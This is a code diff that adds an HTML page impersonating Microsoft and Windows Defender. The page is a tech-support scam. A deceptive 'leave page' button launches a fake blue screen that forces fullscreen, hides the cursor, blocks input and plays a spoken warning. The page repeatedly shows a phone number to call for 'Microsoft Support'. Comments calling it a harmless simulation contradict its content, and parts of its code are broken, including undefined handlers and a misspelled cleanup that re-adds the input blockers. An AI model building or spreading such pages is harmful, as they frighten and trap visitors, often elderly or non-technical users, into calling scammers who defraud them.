@@ -1,0 +1,375 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Theft Detected by Microsoft — Notification + Voice</title>
+<style>
+  :root{
+    --bsod:#052b67; /* deep BSOD blue */
+    --text:#e6f4ff;
+    --muted:#c3e4ff;
+    --mono: "Consolas", "Courier New", monospace;
+    --notif-bg: #f5f6f7;
+    --notif-border: #d0d3d6;
+  }
+  html,body { margin:0; height:100%; font-family: "Segoe UI", Roboto, system-ui, -apple-system, Arial; background:var(--bsod); color:var(--text); }
+  /* Top notification bar (permission-like) */
+  #notifBar {
+    position:fixed;
+    top:8px;
+    left:50%;
+    transform:translateX(-50%);
+    z-index:2147483647;
+    display:flex;
+    align-items:center;
+    gap:12px;
+    padding:8px 12px;
+    border-radius:10px;
+    background:var(--notif-bg);
+    color:#111;
+    border:1px solid var(--notif-border);
+    box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+    max-width:920px;
+    width:calc(100% - 40px);
+    box-sizing:border-box;
+    font-size:14px;
+  }
+  #notifText { flex:1; line-height:1.2; }
+  .notif-actions { display:flex; gap:8px; }
+  button { padding:8px 12px; border-radius:8px; border:none; cursor:pointer; font-weight:600; }
+  .btn-accept { background:#0b61d6; color:#fff; }
+  .btn-cancel { background:transparent; color:#333; border:1px solid #cfd2d6; }
+
+  /* Hidden initial content area (just for fallback) */
+  #main {
+    height:100vh; display:flex; align-items:center; justify-content:center;
+  }
+
+  /* Fullscreen BSOD layout (hidden until activated) */
+  #bsod {
+    display:none;
+    height:100vh; width:100vw;
+    padding:6vh 6vw;
+    box-sizing:border-box;
+    overflow:hidden;
+    user-select:none;
+    -webkit-user-select:none;
+  }
+  .bsod-inner { display:flex; flex-direction:column; gap:22px; align-items:flex-start; justify-content:center; height:100%; }
+  .top { display:flex; gap:20px; align-items:center; }
+  .sad { font-size:6.4rem; line-height:1; font-weight:700; }
+  h1 { margin:0; font-size:2.4rem; font-weight:600; color:var(--text); }
+  .lead { margin:0; color:var(--muted); font-size:1.05rem; max-width:80ch; }
+  .details { margin-top:8px; font-family:var(--mono); color:var(--muted); background: rgba(255,255,255,0.02); padding:18px; border-radius:6px; width:100%; max-width:calc(100% - 120px); box-sizing:border-box; font-size:0.95rem; line-height:1.5; }
+  .fake-dump { margin-top:16px; height:34vh; overflow:auto; background: rgba(0,0,0,0.06); padding:14px; border-radius:6px; border:1px solid rgba(255,255,255,0.02); font-family: var(--mono); font-size:0.82rem; color:#dff0ff; }
+  .hint { margin-top:12px; color:rgba(255,255,255,0.07); font-size:0.95rem; }
+  footer { position:fixed; bottom:12px; left:50%; transform:translateX(-50%); color:var(--muted); font-size:0.86rem; }
+
+  /* blocker overlay */
+  #blocker { position:fixed; inset:0; z-index:999999; background:transparent; display:none; }
+
+  /* hide cursor */
+  .hide-cursor, #bsod.hide-cursor { cursor:none !important; }
+  .hide-cursor * { cursor:none !important; }
+
+  /* accessibility */
+  :focus { outline:none; }
+</style>
+</head>
+<body>
+  <!-- Notification-style consent bar (appears at top like a permission prompt) -->
+  <div id="notifBar" role="dialog" aria-live="polite" aria-label="Fullscreen permission">
+    <div id="notifText">
+      <strong>Window Defender</strong> Windows trying to protect your file and connection.</span>
+    </div>
+    <div class="notif-actions">
+      <button class="btn-cancel" id="goFsBtn">leave page</button>
+    </div>
+  </div>
+
+  <!-- Main (fallback content) -->
+  <div id="main" aria-hidden="true">
+    <div style="text-align:center; color:var(--muted);">
+      <div style="font-size:28px; margin-bottom:8px;">Microsoft detected data breach (External theft detected)</div>
+      <div>BE SAFE AND CONTACT MICROSOFT IMMEDIATELY +1(843)230-0443.</div>
+    </div>
+  </div>
+
+  <!-- BSOD content (hidden until activated for 95 minutes) -->
+  <div id="bsod" role="main" aria-hidden="true" aria-label="Simulated Blue Screen">
+    <div class="bsod-inner" id="bsodInner">
+      <div class="top">
+        <div class="sad">:(</div>
+        <div>
+          <h1>Your PC got attacked by external Virus</h1>
+          <p class="lead">Contact Microsoft Support immediately +1(843)230-0443.</p>
+        </div>
+      </div>
+
+      <div class="details" id="details">
+        <div><strong>Stop code:</strong> <span id="stopcode">KERNEL_MODE_EXCEPTION_NOT_HANDLED</span></div>
+        <div style="margin-top:.6rem;"><strong>Failed module:</strong> <span id="module">dxgkrnl.sys</span> <span style="opacity:.9; margin-left:10px;">(collecting data<span id="dotAni">.</span>)</span></div>
+        <div class="fake-dump" id="dump" tabindex="0" aria-label="Simulated memory dump">
+          <!-- large fake dump filled by JS -->
+        </div>
+        <div class="hint" id="hint">Simulation active — hold <strong>Ctrl + Shift + X</strong> for 2.5s to exit this screen.</div>
+      </div>
+    </div>
+    <footer>@2025 Microsoft Defender Activated do not touch contact us immdeiately +1(843)230-0443 .</footer>
+  </div>
+
+  <!-- blocker to absorb interactions when "frozen" -->
+  <div id="blocker"></div>
+
+<script>
+/* BSOD simulator with notification-style consent + voice.
+   - Save as bsod-notify-voice.html and open in browser.
+   - Clicking "leave page" is required (user gesture) so speech and fullscreen are allowed.
+   - Exit: hold Ctrl+Shift+X for 2500ms. Esc may exit fullscreen in many browsers. 
+   - This page only simulates visually & audibly; it does not crash or modify system files.
+*/
+
+(function(){
+  // Elements
+  const notifBar = document.getElementById('notifBar');
+  const goFsBtn = document.getElementById('goFsBtn');
+  const cancelBtn = document.getElementById('cancelBtn');
+  const bsod = document.getElementById('bsod');
+  const blocker = document.getElementById('blocker');
+  const dump = document.getElementById('dump');
+  const stopcodeEl = document.getElementById('stopcode');
+  const moduleEl = document.getElementById('module');
+  const dotAni = document.getElementById('dotAni');
+  const hint = document.getElementById('hint');
+
+  // realistic codes & drivers
+  const stopCodes = [
+    "KERNEL_MODE_EXCEPTION_NOT_HANDLED",
+    "CRITICAL_PROCESS_DIED",
+    "SYSTEM_THREAD_EXCEPTION_NOT_HANDLED",
+    "IRQL_NOT_LESS_OR_EQUAL",
+    "MEMORY_MANAGEMENT",
+    "PAGE_FAULT_IN_NONPAGED_AREA"
+  ];
+  const drivers = [
+    "dxgkrnl.sys",
+    "nvlddmkm.sys",
+    "atikmpag.sys",
+    "ntoskrnl.exe",
+    "win32kfull.sys",
+    "example_fault_driver.sys",
+    "graphics_driver_fake.sys"
+  ];
+
+  // populate fake codes
+  stopcodeEl.textContent = stopCodes[Math.floor(Math.random()*stopCodes.length)];
+  moduleEl.textContent = drivers[Math.floor(Math.random()*drivers.length)];
+
+  // generate realistic-looking hex dump
+  function hexChunk(len) {
+    let s = "";
+    const hex = "0123456789ABCDEF";
+    for (let i=0;i<len;i++) s += hex.charAt(Math.floor(Math.random()*16));
+    return s;
+  }
+  function makeDump(lines=500) {
+    const parts = [];
+    for (let i=0;i<lines;i++) {
+      const addr = (0x7ff00000 + i*0x10).toString(16).toUpperCase().padStart(8,'0');
+      const bytes = hexChunk(16);
+      const ascii = Array.from(bytes.match(/.{2}/g)).map(b => {
+        const n = parseInt(b,16);
+        return (n >= 32 && n <= 126) ? String.fromCharCode(n) : '.';
+      }).join('');
+      parts.push(addr + '  ' + bytes.match(/.{8}/g).join(' ') + '  ' + ascii);
+    }
+    return parts.join('\n');
+  }
+  dump.textContent = makeDump(600);
+
+  // dot animation
+  let dots = 0;
+  setInterval(()=> {
+    dots = (dots + 1) % 4;
+    dotAni.textContent = '.'.repeat(dots);
+  }, 600);
+
+  // block interactions to simulate freeze (in-page only)
+  function installBlockers() {
+    document.addEventListener('contextmenu', ctxBlock, {capture:true});
+    document.addEventListener('selectstart', ctxBlock, {capture:true});
+    document.addEventListener('mousedown', ctxBlock, {capture:true});
+    document.addEventListener('mouseup', ctxBlock, {capture:true});
+    document.addEventListener('click', ctxBlock, {capture:true});
+    document.addEventListener('dblclick', ctxBlock, {capture:true});
+    document.addEventListener('wheel', ctxBlock, {capture:true});
+    document.addEventListener('keydown', keyBlock, {capture:true});
+    document.addEventListener('copy', ctxBlock, {capture:true});
+    window.addEventListener('blur', tryRefocus, true);
+  }
+  function uninstallBlockers() {
+    document.removeEventListener('contextmenu', ctxBlock, {capture:true});
+    document.removeEventListener('selectstart', ctxBlock, {capture:true});
+    document.removeEventListener('mousedown', ctxBlock, {capture:true});
+    document.removeEventListener('mouseup', ctxBlock, {capture:true});
+    document.removeEventListener('click', ctxBlock, {capture:true});
+    document.removeEventListener('dblclick', ctxBlock, {capture:true});
+    document.removeEventListener('wheel', ctxBlock, {capture:true});
+    document.removeEventListener('keydown', keyBlock, {capture:true});
+    document.removeEventListener('copy', ctxBlock, {capture:true});
+    window.removeEventListener('blur', tryRefocus, true);
+  }
+  function ctxBlock(e){ e.preventDefault(); e.stopPropagation(); }
+  function keyBlock(e){
+    // allow keys needed for exit combo; otherwise block (cannot block system combos)
+    const allowed = ['Control','Shift','x','X','Meta','Alt'];
+    if (allowed.includes(e.key)) {
+      // permit for exit detection logic
+    }
+    e.preventDefault();
+    e.stopPropagation();
+  }
+  function tryRefocus(){ try { window.focus(); dump.focus(); } catch(e){} }
+
+  // Hold exit combo logic (Ctrl+Shift+X for 2500ms)
+  let holdTimer = null;
+  let holdStart = null;
+  const requiredHoldMs = 2500;
+  const keyState = {ctrl:false, shift:false, x:false};
+  function onKeyDown(e){
+    if (e.key === 'Control' || e.key === 'Meta') keyState.ctrl = true;
+    if (e.key === 'Shift') keyState.shift = true;
+    if (e.key.toLowerCase() === 'x') keyState.x = true;
+    if (keyState.ctrl && keyState.shift && keyState.x && !holdTimer) {
+      holdStart = performance.now();
+      holdTimer = setInterval(()=> {
+        if (performance.now() - holdStart >= requiredHoldMs) {
+          clearInterval(holdTimer);
+          holdTimer = null;
+          exitSimulation();
+        }
+      }, 100);
+    }
+  }
+  function onKeyUp(e){
+    if (e.key === 'Control' || e.key === 'Meta') keyState.ctrl = false;
+    if (e.key === 'Shift') keyState.shift = false;
+    if (e.key.toLowerCase() === 'x') keyState.x = false;
+    if (!keyState.ctrl || !keyState.shift || !keyState.x) {
+      if (holdTimer) { clearInterval(holdTimer); holdTimer = null; }
+    }
+  }
+
+  // THEFT DEDUCT: request fullscreen, show BSOD, speak voice
+  async function activateBsodWithVoice() {
+    try {
+      // Request fullscreen — must be in user gesture
+      if (document.documentElement.requestFullscreen) {
+        await document.documentElement.requestFullscreen({navigationUI:"hide"});
+      } else if (document.documentElement.webkitRequestFullscreen) {
+        await document.documentElement.webkitRequestFullscreen();
+      }
+    } catch(e){
+      // ignore if blocked
+    }
+
+    // hide notification bar and show bsod
+    notifBar.style.display = 'none';
+    bsod.style.display = 'block';
+    bsod.setAttribute('aria-hidden','false');
+
+    // add cursor hide
+    setTimeout(()=> document.documentElement.classList.add('hide-cursor'), 120);
+
+    // show blocker
+    blocker.style.display = 'block';
+
+    // install blockers and key listeners
+    installBlockers();
+    document.addEventListener('keydown', onKeyDown, true);
+    document.addEventListener('keyup', onKeyUp, true);
+
+    // focus dump
+    try { dump.focus(); } catch(e){}
+
+    // speak a short phrase using Web Speech (user gesture allows it)
+    playVoice();
+
+    // small auto-scroll for realism
+    let sc = 0;
+    window._bsodAutoScroll = setInterval(()=> {
+      sc += 0.6;
+      dump.scrollTop = Math.min(dump.scrollHeight, sc);
+    }, 200);
+  }
+
+  // play TTS phrase
+  function playVoice() {
+    try {
+      const msg = new SpeechSynthesisUtterance();
+      // choose a concise, non-alarming phrase (you can change text)
+      msg.text = "Your PC detected external theft. We are preventing your computer do not touch contact support immediately.";
+      msg.rate = 0.95;
+      msg.pitch = 0.9;
+      // pick a voice if available (let the browser choose best default)
+      const synth = window.speechSynthesis;
+      // speak immediately
+      synth.cancel(); // cancel pending
+      synth.speak(msg);
+    } catch(e){
+      // speech may not be available; ignore
+    }
+  }
+
+  // exit & cleanup
+  function exitSimulation() {
+    try {
+      if (document.fullscreenElement) document.exitFullscreen();
+    } catch(e){}
+    cleanupAfterExit();
+  }
+
+  function clenup() {
+    // clear auto-scroll
+    try { clearInterval(window._bsodAutoScroll); } catch(e){}
+    // add blockers, not restore cursor
+    blocker.style.display = 'none';
+    document.documentElement.classList.remove('hide-cursor');
+    installBlockers();
+    document.removeEventListener('keydown', onKeyDown, true);
+    document.removeEventListener('keyup', onKeyUp, true);
+    // hide bsod and show a small confirmation in notif area
+    bsod.style.display = 'none';
+    notifBar.style.display = 'flex';
+    notifBar.innerHTML = '<div id="notifText">Simulation exited. Close this tab when ready.</div>';
+    // stop any speech
+    try { window.speechSynthesis.cancel(); } catch(e){}
+  }
+
+  // buttons
+  goFsBtn.addEventListener('click', async (e) => {
+    // user gesture: go fullscreen + run simulation + play voice
+    await activateBsodWithVoice();
+  });
+
+  cancelBtn.addEventListener('click', () => {
+    notifBar.innerHTML = '<div id="notifText">Fullscreen request cancelled.</div>';
+    setTimeout(()=> { notifBar.style.display='none'; }, 3600);
+  });
+
+  // Also listen for fullscreenchange: if the user presses Esc (exits), clean up
+  document.addEventListener('fullscreenchange', () => {
+    if (!document.fullscreenElement) {
+      // if bsod was active, clean up
+      if (bsod.style.display === 'block') cleanupAfterExit();
+    }
+  });
+
+  // Prevent page unload blocking (we don't block unload)
+  window.addEventListener('beforeunload', ()=> { /* no-op */ });
+
+})();
+</script>
+</body>
+</html>
